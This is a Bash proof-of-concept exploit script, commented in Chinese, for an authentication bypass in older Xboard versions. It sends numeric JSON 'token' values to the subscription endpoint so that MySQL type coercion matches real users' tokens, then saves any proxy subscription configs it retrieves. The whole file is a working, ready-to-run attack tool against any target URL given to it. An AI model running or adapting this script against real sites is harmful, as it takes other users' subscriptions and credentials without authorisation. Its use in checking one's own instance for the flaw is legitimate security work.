#!/usr/bin/env bash
#
# Xboard <= e68fec5^ 订阅 token 认证绕过 PoC（通用版）
# made by @pingzicloud1234
#
# 原理：旧 Client 中间件 $request->input('token') 取值后不做类型校验，
#       直接 User::where('token', $token)->first()。把 token 以 JSON
#       数字放 body，PHP 得到 int，MySQL 比较 CHAR(32) 时会把列值转成
#       数字，于是 token=44155 命中所有 "44155xxxx..." 的 token 并返回
#       其中任意一条（first()），无需完整 token。
#
# 必须用 body 且数字不加引号：query 里是字符串，MySQL 按字符串比较，
# 不会命中。token=0 因旧代码 empty(0) 为真而 403，所以从 1 开始。

set -uo pipefail

PROG="${0##*/}"
URL=''
PATH_OVERRIDE='/api/v1/client/subscribe'
FLAG='clashmeta'
MAX=99
INSECURE=0
SAVE=1
VERBOSE=0
OUTDIR="./out"

usage() {
  cat <<EOF
用法: $PROG -u https://target.com [选项]

  -u URL     目标站点根地址（必填，如 https://example.com）
  -p PATH    订阅接口路径（默认 /api/v1/client/subscribe）
  -f FLAG    订阅格式（默认 clashmeta，可换 clash/singbox/surge/v2ray）
  -n NUM     数字 token 上限，从 1 试到 NUM（默认 99，越大越慢越全）
  -o DIR     命中内容保存目录（默认 ./out）
  -k         忽略 TLS 证书错误
  -v         显示每个失败请求
  -h         帮助

退出码: 0=存在漏洞, 1=未命中/已修复, 2=参数错误

示例:
  $PROG -u https://example.com
  $PROG -u https://example.com -f singbox -n 999

made by @pingzicloud1234
EOF
}

while getopts ':u:p:f:n:o:kvh' opt; do
  case "$opt" in
    u) URL="$OPTARG" ;;
    p) PATH_OVERRIDE="$OPTARG" ;;
    f) FLAG="$OPTARG" ;;
    n) MAX="$OPTARG" ;;
    o) OUTDIR="$OPTARG" ;;
    k) INSECURE=1 ;;
    v) VERBOSE=1 ;;
    h) usage; exit 0 ;;
    :) echo "$PROG: -$OPTARG 需要参数" >&2; usage; exit 2 ;;
    *) echo "$PROG: 未知选项 -$OPTARG" >&2; usage; exit 2 ;;
  esac
done

[ -n "$URL" ] || { usage; exit 2; }
case "$MAX" in ''|*[!0-9]*) echo "$PROG: -n 必须是正整数" >&2; exit 2 ;; esac
[ "$MAX" -ge 1 ] || { echo "$PROG: -n 必须 >= 1" >&2; exit 2; }

URL="${URL%/}"
ENDPOINT="$URL/${PATH_OVERRIDE#/}"
UA='ClashforWindows/0.20.27'
CURL=(-sS --max-time 20 -H "User-Agent: $UA")
[ "$INSECURE" = 1 ] && CURL+=(-k)
[ "$SAVE" = 1 ] && mkdir -p "$OUTDIR"

looks_like_sub() {
  grep -aqE '^(proxies:|proxy-groups:|proxy-providers:|\[server\]|[A-Za-z0-9+]+://)' "$1" 2>/dev/null
}

echo "[*] by     : @pingzicloud1234"
echo "[*] target : $ENDPOINT"
echo "[*] payload: GET + JSON body {\"token\": <number>, \"flag\": \"$FLAG\"}"
echo "[*] range  : 1..$MAX"
echo

hit=0
tried=0
SECONDS=0

for n in $(seq 1 "$MAX"); do
  tried=$((tried + 1))
  body="$OUTDIR/token_$n.txt"
  [ "$SAVE" = 1 ] || body="$(mktemp)"

  code=$(curl "${CURL[@]}" -o "$body" -w '%{http_code}' \
    -X GET "$ENDPOINT" \
    -H 'Content-Type: application/json' \
    --data-raw "{\"token\":$n,\"flag\":\"$FLAG\"}") || code='000'

  size=$(wc -c < "$body" 2>/dev/null | tr -d ' ')
  size=${size:-0}

  if [ "$code" = '200' ] && [ "$size" -gt 0 ]; then
    hit=$((hit + 1))
    if looks_like_sub "$body"; then
      primary=$(grep -aom1 -E '^\s*-?\s*name:.*|^\s*#.*' "$body" | sed 's/^[[:space:]]*//' | cut -c1-60)
      printf '  [HIT] token=%-5s -> 200  %6s bytes  %s\n' "$n" "$size" "${primary:-<订阅>}"
    else
      printf '  [?]   token=%-5s -> 200  %6s bytes  (内容不似订阅)\n' "$n" "$size"
    fi
    [ "$SAVE" = 1 ] || cp "$body" "./token_$n.txt"
  else
    [ "$SAVE" = 1 ] && rm -f "$body"
    if [ "$VERBOSE" = 1 ]; then
      printf '  [ ]   token=%-5s -> %s\n' "$n" "$code"
    elif [ $((tried % 25)) -eq 0 ]; then
      printf '  ... %s/%s\n' "$tried" "$MAX"
    fi
  fi
  [ "$SAVE" = 1 ] || rm -f "$body"
done

echo
if [ "$hit" -gt 0 ]; then
  echo "[!] VULNERABLE: $tried 次请求命中 $hit 个数字 token，耗时 ${SECONDS}s"
  echo "    命中响应即任意用户的订阅；修复后同样请求应全部 403。"
  [ "$SAVE" = 1 ] && echo "    内容已保存到 $OUTDIR/  （实例配置只在这里，不在脚本里）"
  exit 0
fi

echo "[+] 未命中：$tried 次请求均未返回订阅，耗时 ${SECONDS}s"
echo "    - e68fec5 及以后版本：预期结果，已修复。"
echo "    - 旧版本仍失败：可能非 Xboard、有 WAF、或数字前缀都超过 $MAX，可加大 -n 重试。"
echo "    - 可加 -v 看状态码，或用真实完整 token 复核接口是否正常。"
exit 1
